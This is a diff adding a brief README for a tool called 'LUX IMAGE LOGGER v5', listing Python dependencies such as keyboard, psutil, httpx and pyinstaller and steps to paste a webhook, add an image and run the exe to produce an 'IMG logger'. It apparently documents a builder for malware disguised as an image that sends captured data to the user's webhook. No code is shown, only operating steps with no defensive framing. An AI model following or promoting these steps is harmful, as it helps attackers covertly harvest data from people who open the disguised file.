@@ -1,0 +1,21 @@
+Requirements:
+─────────────
+pypiwin32
+pylibcheck
+pyinstaller
+psutil
+keyboard
+httpx
+
+
+How to use:
+─────────────
+First run ' setup.bat '
+Net paste your webhook in ' webhook.txt '
+After get your image and paste in the IMG folder 
+Ten run LUX IMAGE LOGGER v5.exe
+Last check workspace for your IMG logger.
+
+ 
+
+
